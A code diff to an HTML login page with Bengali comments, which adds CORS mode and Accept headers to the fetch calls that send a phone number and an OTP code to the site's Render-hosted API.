@@ -190,7 +190,7 @@
     <div class="ad-unit">ADVERTISEMENT - BOTTOM</div>
 
     <script>
-        // রেন্ডার সাইটের লিঙ্ক
+        // রেন্ডার সাইটের লিঙ্ক (Corrected with https)
         const API_BASE_URL = "https://aaf-tele-earn-treading.onrender.com";
         let mode = 'login';
         let step = 1;
@@ -229,9 +229,14 @@
                 btn.disabled = true;
 
                 try {
+                    // CORS Fix in fetch request
                     const response = await fetch(`${API_BASE_URL}/api/send_otp`, {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        mode: 'cors', // এটি মাস্ট
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
                         body: JSON.stringify({ phone: fullPhone })
                     });
                     const data = await response.json();
@@ -264,7 +269,11 @@
                 try {
                     const response = await fetch(`${API_BASE_URL}/api/verify_login`, {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        mode: 'cors', // এটি মাস্ট
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
                         body: JSON.stringify({
                             phone: fullPhone,
                             code: otpCode,
@@ -292,4 +301,4 @@
         }
     </script>
 </body>
-                    </html>
+</html>
